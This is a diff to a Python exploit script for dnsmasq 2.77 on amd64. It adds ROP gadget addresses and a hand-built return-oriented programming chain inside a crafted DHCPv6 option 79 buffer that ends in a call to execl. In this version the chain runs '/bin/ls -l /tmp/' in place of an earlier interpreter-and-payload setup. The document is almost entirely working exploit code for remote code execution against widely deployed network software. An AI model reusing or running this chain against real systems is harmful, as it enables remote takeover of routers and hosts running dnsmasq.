@@ -153,6 +153,13 @@ ROP = {
     },
     "amd64": {
         "2.77": {
+            "pop rax": 0x000000000042213c,  # pop rax ; add dh, dh ; ret
+            "pop rbp": 0x0000000000402eb6,  # pop rbp ; ret
+            "pop rbx": 0x000000000040ae5c,  # pop rbx ; ret
+            "mov ecx": 0x000000000040ec0c,  # mov ecx, edi ; shl eax, cl ; or dword ptr [rdx], eax ; ret
+            "set r8d": 0x0000000000420603,  # mov r8d, 0x7750022 ; ret
+            "add r8d": 0x0000000000428326,  # add r8d, [rcx]; mov [rbp], rax; add rsp, 8; mov rax, rbx; pop rbx; pop rbp; ret
+            "pop rdx": 0x0000000000402fb1,  # pop rdx ; ret
             "pop rsi": 0x00000000004038eb,  # pop rsi; ret
             "pop rdi": 0x0000000000403439,  # pop rdi; ret
             "mov": 0x00000000004338f9       # mov qword ptr [rsi + 0x70], rdi ; ret
@@ -559,13 +566,13 @@ def exploit():
 
     elif architecture == "amd64":
 
-        interpreter_addr = DATA[architecture][dnsmasq_version]
-        interpreter_arg_addr = interpreter_addr + len(interpreter) + (8 - (len(interpreter) % 8)) + 8
-        payload_addr = interpreter_arg_addr + len(interpreter_arg) + (8 - (len(interpreter_arg) % 8)) + 8
+        path_to_command = DATA[architecture][dnsmasq_version]
+        arg = DATA[architecture][dnsmasq_version] + 8
+        path = DATA[architecture][dnsmasq_version] + 8 + 8
 
-        print "Interpreter address: " + str(hex(interpreter_addr))
-        print "Interpreter argument address: " + str(hex(interpreter_arg_addr))
-        print "Payload address: " + str(hex(payload_addr))
+        print "path_to_command: " + str(hex(path_to_command))
+        print "arg: " + str(hex(arg))
+        print "path: " + str(hex(path))
 
         option_79 += Base.pack16(0)  # mac_type
 
@@ -579,16 +586,66 @@ def exploit():
         option_79 += Base.pack64(NOP[architecture])  # R15 = 0x9090909090909090
 
         # option_79 += Base.pack64(CRASH[architecture])  # crash for debug
-        option_79 += add_string_in_data(interpreter_addr, interpreter)
-        option_79 += add_string_in_data(interpreter_arg_addr, interpreter_arg)
-        option_79 += add_string_in_data(payload_addr, payload)
+
+        # R8D = 0x7750022
+        option_79 += Base.pack64(ROP[architecture][dnsmasq_version]["set r8d"])
+
+        # RSI + 0x70 = ADDR(path) = 0xFFFFFFFEF88AFFDE
+        option_79 += Base.pack64(ROP[architecture][dnsmasq_version]["pop rsi"])
+        option_79 += Base.pack64(path - 0x70)
+        option_79 += Base.pack64(ROP[architecture][dnsmasq_version]["pop rdi"])
+        option_79 += Base.pack64(0xFFFFFFFEF88AFFDE)
+        option_79 += Base.pack64(ROP[architecture][dnsmasq_version]["mov"])
+
+        # RDI = ADDR(path) = 0xFFFFFFFEF88AFFDE
+        option_79 += Base.pack64(ROP[architecture][dnsmasq_version]["pop rdi"])
+        option_79 += Base.pack64(path)
+
+        # ECX = ADDR(path) = 0xFFFFFFFEF88AFFDE
+        option_79 += Base.pack64(ROP[architecture][dnsmasq_version]["pop rdx"])
+        option_79 += Base.pack64(path + 8)
+        option_79 += Base.pack64(ROP[architecture][dnsmasq_version]["mov ecx"])
+
+        # EBP = ADDR(path) = 0xFFFFFFFEF88AFFDE
+        option_79 += Base.pack64(ROP[architecture][dnsmasq_version]["pop rbp"])
+        option_79 += Base.pack64(path)
+
+        # R8D = 0x0000000000000000
+        option_79 += Base.pack64(ROP[architecture][dnsmasq_version]["add r8d"])
+        option_79 += Base.pack64(NOP[architecture])  # RBX = 0x9090909090909090
+        option_79 += Base.pack64(NOP[architecture])  # RBP = 0x9090909090909090
+        option_79 += Base.pack64(NOP[architecture])
+
+        # Add strings to .data
+        option_79 += add_string_in_data(path_to_command, "/bin/ls")
+        option_79 += add_string_in_data(arg, "-l")
+        option_79 += add_string_in_data(path, "/tmp/")
+
+        # ECX = "/tmp/"
+        option_79 += Base.pack64(ROP[architecture][dnsmasq_version]["pop rdi"])
+        option_79 += Base.pack64(path)
+        option_79 += Base.pack64(ROP[architecture][dnsmasq_version]["pop rdx"])
+        option_79 += Base.pack64(path + 8)
+        option_79 += Base.pack64(ROP[architecture][dnsmasq_version]["mov ecx"])
+
+        # ESI = "/bin/ls"
+        option_79 += Base.pack64(ROP[architecture][dnsmasq_version]["pop rsi"])
+        option_79 += Base.pack64(path_to_command)
+
+        # EDI = "/bin/ls"
+        option_79 += Base.pack64(ROP[architecture][dnsmasq_version]["pop rdi"])
+        option_79 += Base.pack64(path_to_command)
+
+        # RAX = 0x0000000000000000
+        option_79 += Base.pack64(ROP[architecture][dnsmasq_version]["pop rax"])
+        option_79 += Base.pack64(0x0000000000000000)
+
+        # EDX = "-l"
+        option_79 += Base.pack64(ROP[architecture][dnsmasq_version]["pop rdx"])
+        option_79 += Base.pack64(arg)
 
         # option_79 += Base.pack64(CRASH[architecture])  # crash for debug
         option_79 += Base.pack64(EXECL[architecture][dnsmasq_version])  # address of execl
-        option_79 += Base.pack64(interpreter_addr)                      # address of interpreter
-        option_79 += Base.pack64(interpreter_addr)                      # address of interpreter
-        option_79 += Base.pack64(interpreter_arg_addr)                  # address of interpreter argument
-        option_79 += Base.pack64(payload_addr)                          # address of payload
 
     else:
         print Base.c_error + "This architecture: " + architecture + " not yet supported!"
